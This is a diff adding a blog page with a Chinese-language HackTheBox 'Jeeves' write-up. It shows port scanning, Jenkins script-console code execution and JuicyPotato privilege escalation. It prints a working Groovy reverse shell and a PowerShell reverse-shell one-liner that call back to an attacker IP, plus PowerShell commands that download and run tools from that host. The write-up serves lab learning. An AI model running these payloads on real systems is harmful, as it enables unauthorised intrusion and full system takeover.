@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta name="google-site-verification" content="GjYXsAVrVHmdPdK6OZsuxDfM_CMjMll3MMINgHy5joM" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>HTB Jeeves Writeup | Ikonw&#39;s blog</title>
+  <meta name="description" content="Hackthebox  machine writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB Jeeves Writeup">
+<meta property="og:url" content="https://ik0nw.github.io/2020/02/10/HTB-jeeves/index.html">
+<meta property="og:site_name" content="Ikonw&#39;s Blog">
+<meta property="og:description" content="Hackthebox  machine writeup">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210150159535.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210151238290.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210151854700.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210151933875.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210152219120.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210152346618.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210160029978.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/old-machine-images/20200210160108974.png">
+<meta property="og:image" content="https://ik0nw.github.io/images/root.gif">
+<meta property="article:published_time" content="2020-02-09T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-24T13:38:15.215Z">
+<meta property="article:author" content="Ik0nw">
+<meta property="article:tag" content="hackthebox">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ik0nw.github.io/images/old-machine-images/20200210150159535.png">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://ik0nw.github.io/2020/02/10/HTB-jeeves/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="Ikonw&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.4.0/dist/gitalk.min.css">
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+
+
+<body class="main-center theme-black no-sidebar" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/ik0nw" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.png" width="600" height="600">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">Ikonw</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">HacktheBox Player | OSCP</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Singapore</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-todo">
+          <a href="/todo">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Todo</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ik0nw" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">HTB Profile</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <script src="https://www.hackthebox.eu/badge/122569"></script>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackTheBox-Hard/">HackTheBox-Hard</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/HackTheBox-Medium/">HackTheBox-Medium</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox/">hackthebox</a><span class="category-list-count">12</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox/fortress/">fortress</a><span class="category-list-count">2</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a><span class="category-list-count">2</span><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/misc/">misc</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/hackthebox-challenge/mobile/">mobile</a><span class="category-list-count">1</span></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/php-audit/">php-audit</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/" rel="tag">PHP</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/cve/" rel="tag">cve</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dig/" rel="tag">dig</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dns-enumeration/" rel="tag">dns enumeration</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/enumeration/" rel="tag">enumeration</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/forensic/" rel="tag">forensic</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/fortress/" rel="tag">fortress</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gitalk/" rel="tag">gitalk</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hackthebox/" rel="tag">hackthebox</a><span class="tag-list-count">16</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hard/" rel="tag">hard</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/medium/" rel="tag">medium</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mysql-exec-cmd/" rel="tag">mysql exec_cmd</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/scripting/" rel="tag">scripting</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/smb/" rel="tag">smb</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Archive</h3>
+    <div class="widget-body">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a><span class="archive-list-count">7</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">4</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget-body">
+      <ul class="recent-post-list list-unstyled no-thumbnail">
+        
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/php-audit/">php-audit</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/23/PHP::Preg_replace()-RCE/" class="title">PHP::Preg_replace() RCE</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-23T00:00:00.000Z" itemprop="datePublished">2020-09-23</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox/fortress/">fortress</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/21/HTB-fortress-Jet/" class="title">HTB Jet Fortress writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-20T16:00:00.000Z" itemprop="datePublished">2020-09-21</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox/fortress/">fortress</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/19/HTB-fortress-akerva/" class="title">HTB Akerva Fortress writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-19T00:22:26.000Z" itemprop="datePublished">2020-09-19</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox/">hackthebox</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/17/HTB-Compromised/" class="title">HTB Compromised Writeup</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-16T23:28:25.000Z" itemprop="datePublished">2020-09-17</time>
+              </p>
+            </div>
+          </li>
+          
+          <li>
+            
+            <div class="item-inner">
+              <p class="item-category">
+                <a class="category-link" href="/categories/hackthebox-challenge/">hackthebox-challenge</a><i class="icon icon-angle-right"></i><a class="category-link" href="/categories/hackthebox-challenge/mobile/">mobile</a>
+              </p>
+              <p class="item-title">
+                <a href="/2020/09/11/Challenge-Cat/" class="title">HTB::Challenge [Mobile] Cat</a>
+              </p>
+              <p class="item-date">
+                <time datetime="2020-09-10T21:38:37.000Z" itemprop="datePublished">2020-09-11</time>
+              </p>
+            </div>
+          </li>
+          
+      </ul>
+    </div>
+  </div>
+  
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-HTB-jeeves" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      HTB Jeeves Writeup
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2020/02/10/HTB-jeeves/" class="article-date">
+	  <time datetime="2020-02-09T16:00:00.000Z" itemprop="datePublished">2020-02-10</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/hackthebox/">hackthebox</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/hackthebox/" rel="tag">hackthebox</a>
+  </span>
+
+
+        
+	<span class="article-read hidden-xs">
+	    <i class="icon icon-eye-fill" aria-hidden="true"></i>
+	    <span id="busuanzi_container_page_pv">
+			<span id="busuanzi_value_page_pv">0</span>
+		</span>
+	</span>
+
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2020/02/10/HTB-jeeves/#comments" class="article-comment-link">Comments</a></span>
+        
+	
+		<span class="post-wordcount hidden-xs" itemprop="wordCount">Word Count: 1.1k(words)</span>
+	
+	
+		<span class="post-readcount hidden-xs" itemprop="timeRequired">Read Count: 6(minutes)</span>
+	
+
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <p>攻击机：官方Kali linux 2019 64位<br>作者：<strong>Ikonw</strong></p>
+<h1 id="靶机介绍"><a href="#靶机介绍" class="headerlink" title="靶机介绍"></a>靶机介绍</h1><p><img src="/images/old-machine-images/20200210150159535.png" alt="在这里插入图片描述"></p>
+<h1 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h1><p>日常的 HTTP端口80 和 端口50000 Jetty HTTP服务器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-02-03 15:11 +08</span><br><span class="line">Nmap scan report for 10.10.10.63</span><br><span class="line">Host is up (0.27s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE      VERSION</span><br><span class="line">80&#x2F;tcp    open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS&#x2F;10.0</span><br><span class="line">|_http-title: Ask Jeeves</span><br><span class="line">135&#x2F;tcp   open  msrpc        Microsoft Windows RPC</span><br><span class="line">445&#x2F;tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">50000&#x2F;tcp open  http         Jetty 9.4.z-SNAPSHOT</span><br><span class="line">|_http-server-header: Jetty(9.4.z-SNAPSHOT)</span><br><span class="line">|_http-title: Error 404 Not Found</span><br><span class="line">Service Info: Host: JEEVES; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 5h00m43s, deviation: 0s, median: 5h00m43s</span><br><span class="line">|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2020-02-03T12:12:37</span><br><span class="line">|_  start_date: 2020-02-03T09:12:36</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 49.01 seconds</span><br><span class="line"></span><br><span class="line">12345678910111213141516171819202122232425262728293031323334</span><br></pre></td></tr></table></figure>
+
+<h1 id="二，Enumeration"><a href="#二，Enumeration" class="headerlink" title="二，Enumeration"></a>二，Enumeration</h1><p>Gobuster 结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@xing:~&#x2F;Desktop&#x2F;hackthebox&#x2F;wordlist# gobuster dir -w directory-list-2.3-medium.txt -u &quot;http:&#x2F;&#x2F;10.10.10.63:50000&quot; -t 50</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Url:            http:&#x2F;&#x2F;10.10.10.63:50000</span><br><span class="line">[+] Threads:        50</span><br><span class="line">[+] Wordlist:       directory-list-2.3-medium.txt</span><br><span class="line">[+] Status codes:   200,204,301,302,307,401,403</span><br><span class="line">[+] User Agent:     gobuster&#x2F;3.0.1</span><br><span class="line">[+] Timeout:        10s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2020&#x2F;02&#x2F;10 15:07:50 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;askjeeves (Status: 302)</span><br><span class="line"></span><br><span class="line">12345678910111213141516</span><br></pre></td></tr></table></figure>
+
+<p>发现了CMS Jenkins</p>
+<p><img src="/images/old-machine-images/20200210151238290.png" alt="在这里插入图片描述"><br>Google了后 发现 Jenkins 的script console 能执行 Groovy 代码。</p>
+<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/">传送门</a></p>
+<p><img src="/images/old-machine-images/20200210151854700.png" alt="在这里插入图片描述"><br><img src="/images/old-machine-images/20200210151933875.png" alt="在这里插入图片描述"><br>Google 下 Groovy reverse shell</p>
+<p>这个项目有很多方便的Reverse shell的代码</p>
+<p>[传送门](<a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell Cheatsheet.md)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String host&#x3D;&quot;10.10.14.6&quot;;</span><br><span class="line">int port&#x3D;4242;</span><br><span class="line">String cmd&#x3D;&quot;cmd.exe&quot;;</span><br><span class="line">Process p&#x3D;new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s&#x3D;new Socket(host,port);InputStream pi&#x3D;p.getInputStream(),pe&#x3D;p.getErrorStream(), si&#x3D;s.getInputStream();OutputStream po&#x3D;p.getOutputStream(),so&#x3D;s.getOutputStream();while(!s.isClosed())&#123;while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try &#123;p.exitValue();break;&#125;catch (Exception e)&#123;&#125;&#125;;p.destroy();s.close();</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>
+
+<p>成功拿到 cmd shell<br><img src="/images/old-machine-images/20200210152219120.png" alt="在这里插入图片描述"></p>
+<h1 id="三，-Root"><a href="#三，-Root" class="headerlink" title="三， Root"></a>三， Root</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\.jenkins&gt;whoami &#x2F;priv</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>发现Privileges的 SeImpersonatePrivilege 是 enable<br>我们滥用这个特权让系统用SYSTEM来执行我们的文件 从而取得提权<br>我们可以使用 Juicy-Potato 进行提权。</p>
+<p>想要了解更多的可以点击传送门进行阅读</p>
+<p><a target="_blank" rel="noopener" href="https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/">传送门</a></p>
+<p><img src="/images/old-machine-images/20200210152346618.png" alt="在这里插入图片描述"><br>首先，我们要制作一个 JuicyPotato 的文件 可以从github下载 然后编译。</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/ohpe/juicy-potato">JuicyPotato项目地址</a></p>
+<p>我个人是用Visual Studio 2019 进行编译<br>完成后 获得 JuicyPotato.exe</p>
+<p>创建一个 Powershell Reverse shell 脚本 命名为 powershell.bat</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -c &quot;$client &#x3D; New-Object System.Net.Sockets.TCPClient(&#39;10.10.14.6&#39;,5555);$stream &#x3D; $client.GetStream();[byte[]]$bytes &#x3D; 0..65535|%&#123;0&#125;;while(($i &#x3D; $stream.Read($bytes, 0, $bytes.Length)) -ne 0)&#123;;$data &#x3D; (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback &#x3D; (iex $data 2&gt;&amp;1 | Out-String );$sendback2 &#x3D; $sendback + &#39;PS &#39; + (pwd).Path + &#39;&gt; &#39;;$sendbyte &#x3D; ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br><span class="line"></span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<p>然后使用powershell 命令 上传这两个文件到我们的靶机上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;(New-Object System.Net.Webclient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.14.6&#x2F;juicypotato.exe&#39;,&#39;C:\Users\kohsuke\Desktop\juicypotato.exe&#39;</span><br><span class="line">powershell -c &quot;(New-object System.Net.Webclient).DownloadFile(&#39;http:&#x2F;&#x2F;10.10.14.6&#x2F;cmd.bat&#39;,&#39;C:\Users\kohsuke\Desktop\cmd.bat&#39;)&quot;</span><br><span class="line">12</span><br></pre></td></tr></table></figure>
+
+<p>然后使用执行<br><img src="/images/old-machine-images/20200210160029978.png" alt="在这里插入图片描述"><br>成功拿到reverse shell</p>
+<p><img src="/images/old-machine-images/20200210160108974.png" alt="在这里插入图片描述"></p>
+<br/>
+<br/>
+<br/>
+
+<p><img src="/images/root.gif" alt="root"></p>
+
+      
+    </div>
+    <div class="article-footer">
+      
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+           
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2020/02/10/HTB-Active/" title="HTB Active Writeup"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2020/01/26/HTB-Heist/" title="HTB Heist Writeup"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/ik0nw" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+
+    </div>
+</footer>
